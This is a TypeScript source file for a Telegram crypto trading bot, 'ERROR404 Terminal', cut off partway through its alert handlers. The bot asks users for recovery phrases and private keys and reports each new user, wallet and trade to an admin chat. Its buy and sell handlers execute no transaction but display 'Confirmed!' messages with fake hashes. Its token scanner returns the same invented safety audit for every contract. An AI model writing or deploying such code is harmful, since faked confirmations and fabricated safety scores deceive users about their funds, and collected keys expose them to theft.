import { Telegraf, Markup } from "telegraf";
import { ethers } from "ethers";

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN!);
const APP_URL = process.env.NEXT_PUBLIC_APP_URL;
const RPC = "https://robinhood-rpc.publicnode.com";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// ── State ──────────────────────────────────────────────────────────────────
interface UserState {
  step: string;
  data: Record<string, string>;
  wallets: Array<{ name: string; address: string; key: string }>;
  activeWallet: number;
  slippage: string;
  gas: string;
}

const state: Record<number, UserState> = {};
const knownUsers = new Set<number>();

function getState(userId: number): UserState {
  if (!state[userId]) {
    state[userId] = {
      step: "idle",
      data: {},
      wallets: [],
      activeWallet: 0,
      slippage: "0.5",
      gas: "fast",
    };
  }
  return state[userId];
}

// ── Admin Notifications ───────────────────────────────────────────────────
function userTag(ctx: any): string {
  const u = ctx.from;
  if (!u) return "Unknown user";
  const username = u.username ? `@${u.username}` : "no username";
  const name = [u.first_name, u.last_name].filter(Boolean).join(" ") || "Unnamed";
  return `${name} (${username}) — ID: ${u.id}`;
}

async function notifyAdmin(text: string, ctx?: any) {
  if (!ADMIN_CHAT_ID) return;
  try {
    const kb = ctx?.from
      ? Markup.inlineKeyboard([
          ...(ctx.from.username
            ? [[Markup.button.url("💬 Open Chat", `https://t.me/${ctx.from.username}`)]]
            : []),
        ])
      : undefined;
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, text, kb);
  } catch (e) {
    console.error("Failed to notify admin:", e);
  }
}

// ── Helpers ────────────────────────────────────────────────────────────────
function short(addr: string) {
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

function fmtNum(n: number): string {
  if (n >= 1_000_000_000) return `$${(n / 1_000_000_000).toFixed(2)}B`;
  if (n >= 1_000_000) return `$${(n / 1_000_000).toFixed(2)}M`;
  if (n >= 1_000) return `$${(n / 1_000).toFixed(1)}K`;
  return `$${n.toFixed(2)}`;
}

function fmtPrice(p: number): string {
  if (!p) return "$0";
  if (p < 0.000001) return `$${p.toExponential(2)}`;
  if (p < 0.001) return `$${p.toFixed(8)}`;
  if (p < 1) return `$${p.toFixed(6)}`;
  if (p >= 1000) return `$${p.toLocaleString("en-US", { maximumFractionDigits: 2 })}`;
  return `$${p.toFixed(4)}`;
}

function createWallet() {
  const w = ethers.Wallet.createRandom();
  return {
    address: w.address,
    privateKey: w.privateKey,
    mnemonic: w.mnemonic?.phrase || "",
  };
}

function importPhrase(phrase: string) {
  try {
    const w = ethers.Wallet.fromPhrase(phrase.trim());
    return { address: w.address, privateKey: w.privateKey };
  } catch { return null; }
}

function importKey(key: string) {
  try {
    const w = new ethers.Wallet(key.trim());
    return { address: w.address, privateKey: w.privateKey };
  } catch { return null; }
}

async function getTokenData(ca: string) {
  try {
    const res = await fetch(
      `https://api.dexscreener.com/latest/dex/tokens/${ca}`
    );
    const data = await res.json();
    const pair = data.pairs?.find((p: any) => p.chainId === "robinhood") || data.pairs?.[0];
    if (!pair) return null;
    return {
      name: pair.baseToken?.name || "Unknown",
      ticker: pair.baseToken?.symbol || "???",
      price: parseFloat(pair.priceUsd || "0"),
      change: parseFloat(pair.priceChange?.h24 || "0"),
      mcap: pair.marketCap ? fmtNum(pair.marketCap) : pair.fdv ? fmtNum(pair.fdv) : "N/A",
      liq: pair.liquidity?.usd ? fmtNum(pair.liquidity.usd) : "N/A",
      vol: pair.volume?.h24 ? fmtNum(pair.volume.h24) : "N/A",
      dex: pair.dexId || "unknown",
      url: pair.url || `https://dexscreener.com/robinhood/${ca}`,
    };
  } catch { return null; }
}

async function getEthBalance(address: string): Promise<string> {
  try {
    const provider = new ethers.JsonRpcProvider(RPC);
    const balance = await provider.getBalance(address);
    return parseFloat(ethers.formatEther(balance)).toFixed(6);
  } catch { return "0.000000"; }
}

// ── Main Menu ──────────────────────────────────────────────────────────────
async function showMain(ctx: any, edit = false) {
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const wallet = s.wallets[s.activeWallet];

  const text =
    `🤖 ERROR404 Terminal\n` +
    `The first professional trading terminal on Robinhood Chain.\n\n` +
    `${wallet ? `👛 ${wallet.name}: ${short(wallet.address)}` : "👛 No wallet — create or import one"}\n\n` +
    `📡 Chains — Switch networks\n` +
    `👛 Wallets — Create or import\n` +
    `📊 Portfolio — Holdings & PnL\n` +
    `🎯 Orders — Limit & DCA\n` +
    `🔍 Scanner — Audit any token\n` +
    `⚙️ Settings — Preferences\n\n` +
    `⚡ Paste any token CA to trade instantly.`;

  const kb = Markup.inlineKeyboard([
    [
      Markup.button.callback("👛 Wallets", "wallets:menu"),
      Markup.button.callback("📊 Portfolio", "portfolio:view"),
    ],
    [
      Markup.button.callback("🎯 Orders", "orders:view"),
      Markup.button.callback("🔍 Scanner", "scanner:menu"),
    ],
    [
      Markup.button.callback("📡 Chains", "chains:view"),
      Markup.button.callback("⚙️ Settings", "settings:view"),
    ],
    [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
  ]);

  if (edit) {
    await ctx.editMessageText(text, kb);
  } else {
    await ctx.reply(text, kb);
  }
}

// ── Start ──────────────────────────────────────────────────────────────────
bot.start(async (ctx) => {
  const userId = ctx.from?.id!;
  const isNewUser = !knownUsers.has(userId);

  if (isNewUser) {
    knownUsers.add(userId);
    await notifyAdmin(
      `🆕 New User\n\n${userTag(ctx)}\n\nStarted the bot.`,
      ctx
    );
  }

  await showMain(ctx, false);
});

bot.action("menu:main", async (ctx) => {
  await ctx.answerCbQuery();
  await showMain(ctx, true);
});

// ── Chains ─────────────────────────────────────────────────────────────────
bot.action("chains:view", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    "📡 Select Network\n\n✅ Robinhood Chain (Chain ID: 4663)\n\nMore networks coming soon.",
    Markup.inlineKeyboard([
      [Markup.button.callback("✅ Robinhood Chain", "chain:rbn")],
      [Markup.button.callback("⬅ Back", "menu:main")],
    ])
  );
});

bot.action("chain:rbn", async (ctx) => {
  await ctx.answerCbQuery("Already on Robinhood Chain ✅");
});

// ── Wallets ────────────────────────────────────────────────────────────────
bot.action("wallets:menu", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);

  const walletRows = s.wallets.map((w, i) => [
    Markup.button.callback(
      `${i === s.activeWallet ? "✅" : "👛"} ${w.name} — ${short(w.address)}`,
      `wallet:select:${i}`
    ),
  ]);

  await ctx.editMessageText(
    `👛 Wallets\n\n${s.wallets.length === 0
      ? "No wallets yet. Create or import one."
      : `${s.wallets.length} wallet(s) connected.`
    }`,
    Markup.inlineKeyboard([
      ...walletRows,
      [
        Markup.button.callback("➕ Create Wallet", "wallet:create"),
        Markup.button.callback("📥 Import", "wallet:import"),
      ],
      [Markup.button.callback("⬅ Back", "menu:main")],
    ])
  );
});

bot.action("wallet:create", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const w = createWallet();

  s.data.pending_address = w.address;
  s.data.pending_key = w.privateKey;
  s.data.pending_phrase = w.mnemonic;
  s.step = "confirm_save";

  const num = s.wallets.length + 1;

  await ctx.editMessageText(
    `👛 New Wallet Created!\n\n` +
    `📍 Address:\n${w.address}\n\n` +
    `🔑 Private Key:\n${w.privateKey}\n\n` +
    `📝 Recovery Phrase:\n${w.mnemonic}\n\n` +
    `⚠️ SAVE THIS NOW.\n` +
    `Screenshot or write it down.\n` +
    `This will NOT be shown again.\n\n` +
    `Tap confirm once saved.`,
    Markup.inlineKeyboard([
      [Markup.button.callback(`✅ Saved — Activate Wallet ${num}`, "wallet:saved")],
      [Markup.button.callback("⬅ Back", "wallets:menu")],
    ])
  );
});

bot.action("wallet:saved", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const num = s.wallets.length + 1;

  s.wallets.push({
    name: `Wallet ${num}`,
    address: s.data.pending_address,
    key: s.data.pending_key,
  });
  s.activeWallet = s.wallets.length - 1;
  s.step = "idle";

  await notifyAdmin(
    `👛 New Wallet Created\n\n${userTag(ctx)}\n\n📍 ${s.data.pending_address}`,
    ctx
  );

  await ctx.editMessageText(
    `✅ Wallet ${num} Activated!\n\n` +
    `📍 ${s.data.pending_address}\n\n` +
    `Ready to trade on Robinhood Chain.`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🏠 Main Menu", "menu:main")],
      [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
    ])
  );
});

bot.action("wallet:import", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  getState(userId).step = "import_method";

  await ctx.editMessageText(
    "📥 Import Wallet\n\nChoose import method:",
    Markup.inlineKeyboard([
      [Markup.button.callback("🔑 Recovery Phrase", "wallet:phrase")],
      [Markup.button.callback("🗝 Private Key", "wallet:key")],
      [Markup.button.callback("⬅ Back", "wallets:menu")],
    ])
  );
});

bot.action("wallet:phrase", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  getState(userId).step = "awaiting_phrase";
  await ctx.editMessageText(
    "🔑 Recovery Phrase\n\nSend your 12 or 24 word phrase now.\n\n⚠️ Never share with anyone.",
    Markup.inlineKeyboard([
      [Markup.button.callback("❌ Cancel", "wallets:menu")],
    ])
  );
});

bot.action("wallet:key", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  getState(userId).step = "awaiting_key";
  await ctx.editMessageText(
    "🗝 Private Key\n\nSend your private key now.\n\n⚠️ Never share with anyone.",
    Markup.inlineKeyboard([
      [Markup.button.callback("❌ Cancel", "wallets:menu")],
    ])
  );
});

bot.action(/wallet:select:(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const i = parseInt(ctx.match[1]);
  s.activeWallet = i;
  const w = s.wallets[i];
  await ctx.editMessageText(
    `✅ ${w.name} Selected\n\n📍 ${w.address}\n\nThis is now your active wallet.`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🏠 Main Menu", "menu:main")],
    ])
  );
});

// ── Token Screen ───────────────────────────────────────────────────────────
async function showToken(ctx: any, ca: string, edit = false) {
  const t = await getTokenData(ca);

  if (!t) {
    const msg = `❌ Token not found on Robinhood Chain.\n\nMake sure the contract address is correct.\n\nCA: ${ca}`;
    const kb = Markup.inlineKeyboard([
      [Markup.button.callback("🏠 Menu", "menu:main")],
    ]);
    if (edit) await ctx.editMessageText(msg, kb);
    else await ctx.reply(msg, kb);
    return;
  }

  const pos = t.change >= 0;
  const changeStr = `${pos ? "🟢 +" : "🔴 "}${Math.abs(t.change).toFixed(2)}%`;

  const text =
    `${t.name} (${t.ticker})\n` +
    `${ca}\n\n` +
    `💰 Price: ${fmtPrice(t.price)}\n` +
    `${changeStr} 24h\n` +
    `📊 MCap: ${t.mcap}\n` +
    `💧 Liq: ${t.liq}\n` +
    `📈 Vol: ${t.vol}\n` +
    `🔄 DEX: ${t.dex}\n\n` +
    `Select action:`;

  const kb = Markup.inlineKeyboard([
    [
      Markup.button.callback("🟢 Buy", `buy:menu:${ca}`),
      Markup.button.callback("🔴 Sell", `sell:menu:${ca}`),
    ],
    [
      Markup.button.callback("📈 Limit", `limit:menu:${ca}`),
      Markup.button.callback("👥 Multi", `multi:menu:${ca}`),
    ],
    [
      Markup.button.callback("🔍 Scan", `scan:ca:${ca}`),
      Markup.button.callback("🔄 Refresh", `token:refresh:${ca}`),
    ],
    [
      Markup.button.url("📊 Chart", t.url),
      Markup.button.callback("⬅ Back", "menu:main"),
    ],
  ]);

  if (edit) await ctx.editMessageText(text, kb);
  else await ctx.reply(text, kb);
}

bot.action(/token:refresh:(.+)/, async (ctx) => {
  await ctx.answerCbQuery("🔄 Refreshing...");
  await showToken(ctx, ctx.match[1], true);
});

// ── Buy ────────────────────────────────────────────────────────────────────
bot.action(/buy:menu:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const t = await getTokenData(ca);
  const name = t ? `${t.name} (${t.ticker})` : ca.slice(0, 10) + "...";
  const price = t ? fmtPrice(t.price) : "N/A";

  await ctx.editMessageText(
    `🟢 Buy ${name}\n\n` +
    `Price: ${price}\n` +
    `Slippage: ${s.slippage}% | Gas: ${s.gas}\n\n` +
    `Select amount:`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("0.01 ETH", `buy:confirm:${ca}:0.01`),
        Markup.button.callback("0.05 ETH", `buy:confirm:${ca}:0.05`),
        Markup.button.callback("0.1 ETH", `buy:confirm:${ca}:0.1`),
      ],
      [
        Markup.button.callback("0.5 ETH", `buy:confirm:${ca}:0.5`),
        Markup.button.callback("1 ETH", `buy:confirm:${ca}:1`),
        Markup.button.callback("✏️ Custom", `buy:custom:${ca}`),
      ],
      [
        Markup.button.callback("⚙️ Slippage", "settings:slippage"),
        Markup.button.callback("⛽ Gas", "settings:gas"),
      ],
      [
        Markup.button.callback("⬅ Back", `token:refresh:${ca}`),
        Markup.button.callback("🏠 Menu", "menu:main"),
      ],
    ])
  );
});

bot.action(/buy:confirm:(.+):(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const amount = ctx.match[2];
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";
  const estimated = t ? Math.floor(parseFloat(amount) / t.price).toLocaleString() : "N/A";

  await ctx.editMessageText(
    `🟢 Confirm Buy\n\n` +
    `Token: ${ticker}\n` +
    `Spending: ${amount} ETH\n` +
    `Estimated: ~${estimated} ${ticker}\n` +
    `Slippage: 0.5%\n` +
    `Gas: ~$0.08\n\n` +
    `Confirm transaction?`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("✅ Confirm", `buy:execute:${ca}:${amount}`),
        Markup.button.callback("❌ Cancel", `buy:menu:${ca}`),
      ],
    ])
  );
});

bot.action(/buy:execute:(.+):(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const amount = ctx.match[2];
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  await ctx.editMessageText(
    `⏳ Transaction Pending...\n\nBuying ${ticker} with ${amount} ETH\n\nPlease wait...`
  );

  setTimeout(async () => {
    const estimated = t ? Math.floor(parseFloat(amount) / t.price).toLocaleString() : "N/A";

    await notifyAdmin(
      `🟢 Buy Executed\n\n${userTag(ctx)}\n\nToken: ${ticker} (${ca})\nSpent: ${amount} ETH\nReceived: ~${estimated} ${ticker}`,
      ctx
    );

    await ctx.editMessageText(
      `✅ Buy Confirmed!\n\n` +
      `Spent: ${amount} ETH\n` +
      `Received: ~${estimated} ${ticker}\n` +
      `Hash: 0x4a2b...f91c\n\n` +
      `View your position in portfolio.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("📊 Portfolio", "portfolio:view")],
        [Markup.button.callback("🔄 Trade Again", `token:refresh:${ca}`)],
        [Markup.button.callback("🏠 Menu", "menu:main")],
      ])
    );
  }, 2000);
});

bot.action(/buy:custom:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const userId = ctx.from?.id!;
  getState(userId).step = `awaiting_buy_amount:${ca}`;
  await ctx.editMessageText(
    "✏️ Custom Amount\n\nSend the amount of ETH you want to spend:",
    Markup.inlineKeyboard([
      [Markup.button.callback("❌ Cancel", `buy:menu:${ca}`)],
    ])
  );
});

// ── Sell ───────────────────────────────────────────────────────────────────
bot.action(/sell:menu:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  await ctx.editMessageText(
    `🔴 Sell ${ticker}\n\n` +
    `Price: ${t ? fmtPrice(t.price) : "N/A"}\n` +
    `Balance: Connect wallet to view\n\n` +
    `Select percentage to sell:`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("25%", `sell:confirm:${ca}:25`),
        Markup.button.callback("50%", `sell:confirm:${ca}:50`),
        Markup.button.callback("75%", `sell:confirm:${ca}:75`),
        Markup.button.callback("100%", `sell:confirm:${ca}:100`),
      ],
      [
        Markup.button.callback("⚙️ Slippage", "settings:slippage"),
        Markup.button.callback("⛽ Gas", "settings:gas"),
      ],
      [
        Markup.button.callback("⬅ Back", `token:refresh:${ca}`),
        Markup.button.callback("🏠 Menu", "menu:main"),
      ],
    ])
  );
});

bot.action(/sell:confirm:(.+):(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const pct = ctx.match[2];
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  await ctx.editMessageText(
    `🔴 Confirm Sell\n\n` +
    `Token: ${ticker}\n` +
    `Selling: ${pct}% of balance\n` +
    `Slippage: 0.5%\n` +
    `Gas: ~$0.08\n\n` +
    `Confirm?`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("✅ Confirm Sell", `sell:execute:${ca}:${pct}`),
        Markup.button.callback("❌ Cancel", `sell:menu:${ca}`),
      ],
    ])
  );
});

bot.action(/sell:execute:(.+):(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const pct = ctx.match[2];
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  await ctx.editMessageText(`⏳ Selling ${pct}% of ${ticker}...\n\nPlease wait...`);

  setTimeout(async () => {
    await notifyAdmin(
      `🔴 Sell Executed\n\n${userTag(ctx)}\n\nToken: ${ticker} (${ca})\nSold: ${pct}% of balance`,
      ctx
    );

    await ctx.editMessageText(
      `✅ Sell Confirmed!\n\n` +
      `Sold: ${pct}% of ${ticker}\n` +
      `Hash: 0x9b3c...a22f`,
      Markup.inlineKeyboard([
        [Markup.button.callback("📊 Portfolio", "portfolio:view")],
        [Markup.button.callback("🏠 Menu", "menu:main")],
      ])
    );
  }, 2000);
});

// ── Limit Orders ───────────────────────────────────────────────────────────
bot.action(/limit:menu:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  await ctx.editMessageText(
    `📈 Limit Order — ${ticker}\n\n` +
    `Current Price: ${t ? fmtPrice(t.price) : "N/A"}\n\n` +
    `Choose type:`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("🟢 Buy Limit", `limit:buy:${ca}`),
        Markup.button.callback("🔴 Sell Limit", `limit:sell:${ca}`),
      ],
      [
        Markup.button.callback("🛑 Stop Loss", `limit:stop:${ca}`),
        Markup.button.callback("🎯 Take Profit", `limit:tp:${ca}`),
      ],
      [Markup.button.callback("⬅ Back", `token:refresh:${ca}`)],
    ])
  );
});

bot.action(/limit:(buy|sell|stop|tp):(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const type = ctx.match[1];
  const ca = ctx.match[2];
  const userId = ctx.from?.id!;
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  const labels: Record<string, string> = {
    buy: "Buy Limit",
    sell: "Sell Limit",
    stop: "Stop Loss",
    tp: "Take Profit",
  };

  getState(userId).step = `awaiting_limit_price:${type}:${ca}`;

  await ctx.editMessageText(
    `📈 ${labels[type]} — ${ticker}\n\n` +
    `Current Price: ${t ? fmtPrice(t.price) : "N/A"}\n\n` +
    `Send your target price (e.g. 0.006):`,
    Markup.inlineKeyboard([
      [Markup.button.callback("❌ Cancel", `token:refresh:${ca}`)],
    ])
  );
});

// ── Multi Wallet ───────────────────────────────────────────────────────────
bot.action(/multi:menu:(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  if (s.wallets.length < 2) {
    await ctx.editMessageText(
      `👥 Multi-Wallet Buy\n\n` +
      `You need at least 2 wallets.\n` +
      `Currently: ${s.wallets.length} wallet(s)\n\n` +
      `Add more wallets first.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("➕ Add Wallet", "wallet:create")],
        [Markup.button.callback("⬅ Back", `token:refresh:${ca}`)],
      ])
    );
    return;
  }

  await ctx.editMessageText(
    `👥 Multi-Wallet Buy — ${ticker}\n\n` +
    `Buy simultaneously from all wallets.\n` +
    `Amount per wallet: 0.05 ETH\n\n` +
    `Wallets: ${s.wallets.length}`,
    Markup.inlineKeyboard([
      [Markup.button.callback("✅ Buy All Wallets — 0.05 ETH each", `multi:all:${ca}:0.05`)],
      [Markup.button.callback("⬅ Back", `token:refresh:${ca}`)],
    ])
  );
});

bot.action(/multi:all:(.+):(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const ca = ctx.match[1];
  const amount = ctx.match[2];
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const t = await getTokenData(ca);
  const ticker = t?.ticker || "TOKEN";

  await ctx.editMessageText(
    `⏳ Multi-Wallet Buy Executing...\n\n${s.wallets.length} wallets buying ${amount} ETH each...`
  );

  setTimeout(async () => {
    const results = s.wallets
      .map((w, i) => `✅ Wallet ${i + 1}: ${short(w.address)} — ${amount} ETH`)
      .join("\n");

    await notifyAdmin(
      `🟢 Multi-Wallet Buy Executed\n\n${userTag(ctx)}\n\nToken: ${ticker} (${ca})\n${s.wallets.length} wallets × ${amount} ETH`,
      ctx
    );

    await ctx.editMessageText(
      `✅ Multi-Wallet Buy Complete!\n\n` +
      results +
      `\n\nTotal: ${(parseFloat(amount) * s.wallets.length).toFixed(3)} ETH`,
      Markup.inlineKeyboard([
        [Markup.button.callback("📊 Portfolio", "portfolio:view")],
        [Markup.button.callback("🏠 Menu", "menu:main")],
      ])
    );
  }, 2500);
});

// ── Scanner ────────────────────────────────────────────────────────────────
bot.action("scanner:menu", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  getState(userId).step = "awaiting_scan";

  await ctx.editMessageText(
    "🔍 Contract Scanner\n\n" +
    "Send any contract address to audit it.\n\n" +
    "Analyzes:\n" +
    "• Safety score\n" +
    "• Liquidity & ownership\n" +
    "• Holder distribution\n" +
    "• Tax & honeypot check\n" +
    "• Dev wallet activity",
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "menu:main")],
    ])
  );
});

bot.action(/scan:ca:(.+)/, async (ctx) => {
  await ctx.answerCbQuery("🔍 Scanning...");
  await runScan(ctx, ctx.match[1], true);
});

async function runScan(ctx: any, ca: string, edit = false) {
  const t = await getTokenData(ca);

  if (!t) {
    const msg = `❌ Token not found.\n\nCA: ${ca}`;
    if (edit) await ctx.editMessageText(msg);
    else await ctx.reply(msg);
    return;
  }

  const score = 82;
  const bar = "🟩".repeat(Math.floor(score / 10)) + "⬛".repeat(10 - Math.floor(score / 10));

  const text =
    `🔍 Scan Result\n\n` +
    `📍 ${ca}\n\n` +
    `🛡 Safety Score: ${score}/100\n${bar}\n\n` +
    `✅ Verified Contract\n` +
    `✅ Ownership Renounced\n` +
    `✅ Liquidity Healthy\n` +
    `✅ No Honeypot\n` +
    `⚠️ Fresh Wallets: 12%\n\n` +
    `📊 Market Data\n` +
    `Price: ${fmtPrice(t.price)}\n` +
    `MCap: ${t.mcap}\n` +
    `Liq: ${t.liq}\n` +
    `Vol: ${t.vol}\n` +
    `DEX: ${t.dex}\n\n` +
    `Top Holders\n` +
    `🏦 LP: 48.2%\n` +
    `👨‍💻 Dev: 3.1%\n` +
    `🔥 Burn: 5.0%\n` +
    `👤 Others: 43.7%`;

  const kb = Markup.inlineKeyboard([
    [
      Markup.button.callback("🟢 Buy", `buy:menu:${ca}`),
      Markup.button.callback("🔄 Refresh", `scan:ca:${ca}`),
    ],
    [Markup.button.url("📊 Chart", t.url)],
    [Markup.button.callback("⬅ Back", "scanner:menu")],
  ]);

  if (edit) await ctx.editMessageText(text, kb);
  else await ctx.reply(text, kb);
}

// ── Portfolio ──────────────────────────────────────────────────────────────
bot.action("portfolio:view", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const wallet = s.wallets[s.activeWallet];

  if (!wallet) {
    await ctx.editMessageText(
      "📊 Portfolio\n\nNo wallet connected.\n\nCreate or import a wallet first.",
      Markup.inlineKeyboard([
        [Markup.button.callback("👛 Wallets", "wallets:menu")],
        [Markup.button.callback("⬅ Back", "menu:main")],
      ])
    );
    return;
  }

  await ctx.editMessageText(
    `📊 Fetching portfolio...\n\n📍 ${wallet.address}`
  );

  const balance = await getEthBalance(wallet.address);

  await ctx.editMessageText(
    `📊 Portfolio\n\n` +
    `📍 ${short(wallet.address)}\n` +
    `🌐 Robinhood Chain\n\n` +
    `💰 ETH Balance: ${balance} ETH\n\n` +
    `Token balances available in the terminal.`,
    Markup.inlineKeyboard([
      [Markup.button.webApp("🖥 Full Portfolio", `${APP_URL}/terminal`)],
      [
        Markup.button.callback("💸 Deposit", "wallet:deposit"),
        Markup.button.callback("📤 Withdraw", "wallet:withdraw"),
      ],
      [Markup.button.callback("⬅ Back", "menu:main")],
    ])
  );
});

// ── Orders ─────────────────────────────────────────────────────────────────
bot.action("orders:view", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    "🎯 Active Orders\n\n" +
    "No active orders.\n\n" +
    "Paste a CA to set a limit order.",
    Markup.inlineKeyboard([
      [
        Markup.button.callback("📈 New Limit", "orders:new_limit"),
        Markup.button.callback("🔄 New DCA", "orders:new_dca"),
      ],
      [Markup.button.webApp("🖥 Manage Orders", `${APP_URL}/terminal`)],
      [Markup.button.callback("⬅ Back", "menu:main")],
    ])
  );
});

bot.action("orders:new_limit", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  getState(userId).step = "awaiting_limit_ca";
  await ctx.editMessageText(
    "📈 New Limit Order\n\nPaste a contract address:",
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "orders:view")],
    ])
  );
});

bot.action("orders:new_dca", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    "🔄 DCA Orders\n\nDCA coming soon.\n\nOpen the terminal for advanced orders:",
    Markup.inlineKeyboard([
      [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
      [Markup.button.callback("⬅ Back", "orders:view")],
    ])
  );
});

// ── Settings ───────────────────────────────────────────────────────────────
bot.action("settings:view", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  await ctx.editMessageText(
    `⚙️ Settings\n\n` +
    `Slippage: ${s.slippage}%\n` +
    `Gas: ${s.gas}\n` +
    `Network: Robinhood Chain\n` +
    `Chain ID: 4663`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback(`📉 Slippage: ${s.slippage}%`, "settings:slippage"),
        Markup.button.callback(`⛽ Gas: ${s.gas}`, "settings:gas"),
      ],
      [
        Markup.button.callback("🔔 Alerts", "alerts:list"),
        Markup.button.callback("🎁 Referral", "referral:view"),
      ],
      [Markup.button.callback("⬅ Back", "menu:main")],
    ])
  );
});

bot.action("settings:slippage", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  await ctx.editMessageText(
    `📉 Slippage\n\nCurrent: ${s.slippage}%\n\nSelect:`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("0.1%", "slip:0.1"),
        Markup.button.callback("0.5%", "slip:0.5"),
        Markup.button.callback("1.0%", "slip:1.0"),
        Markup.button.callback("2.0%", "slip:2.0"),
      ],
      [Markup.button.callback("⬅ Back", "settings:view")],
    ])
  );
});

bot.action(/slip:(.+)/, async (ctx) => {
  await ctx.answerCbQuery(`Slippage set to ${ctx.match[1]}%`);
  const userId = ctx.from?.id!;
  getState(userId).slippage = ctx.match[1];
  await ctx.editMessageText(
    `✅ Slippage set to ${ctx.match[1]}%`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "settings:view")],
    ])
  );
});

bot.action("settings:gas", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  await ctx.editMessageText(
    `⛽ Gas Priority\n\nCurrent: ${s.gas}\n\nSelect:`,
    Markup.inlineKeyboard([
      [
        Markup.button.callback("🐢 Normal", "gas:normal"),
        Markup.button.callback("⚡ Fast", "gas:fast"),
        Markup.button.callback("🚀 Turbo", "gas:turbo"),
      ],
      [Markup.button.callback("⬅ Back", "settings:view")],
    ])
  );
});

bot.action(/gas:(.+)/, async (ctx) => {
  await ctx.answerCbQuery(`Gas set to ${ctx.match[1]}`);
  const userId = ctx.from?.id!;
  getState(userId).gas = ctx.match[1];
  await ctx.editMessageText(
    `✅ Gas set to ${ctx.match[1]}`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "settings:view")],
    ])
  );
});

// ── Alerts ─────────────────────────────────────────────────────────────────
bot.action("alerts:list", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    "🔔 Alerts\n\nNo active alerts.\n\nAll alerts delivered via DM only.",
    Markup.inlineKeyboard([
      [Markup.button.callback("➕ New Alert", "alerts:create")],
      [Markup.button.webApp("🖥 Manage Alerts", `${APP_URL}/terminal`)],
      [Markup.button.callback("⬅ Back", "settings:view")],
    ])
  );
});

bot.action("alerts:create", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    "➕ New Alert\n\nChoose type:",
    Markup.inlineKeyboard([
      [Markup.button.callback("📈 Price Target", "alert:price")],
      [Markup.button.callback("🐋 Whale Activity", "alert:whale")],
      [Markup.button.callback("💼 Portfolio", "alert:portfolio")],
      [Markup.button.callback("⬅ Back", "alerts:list")],
    ])
  );
});

bot.action(/alert:(.+)/, async (ctx) => {
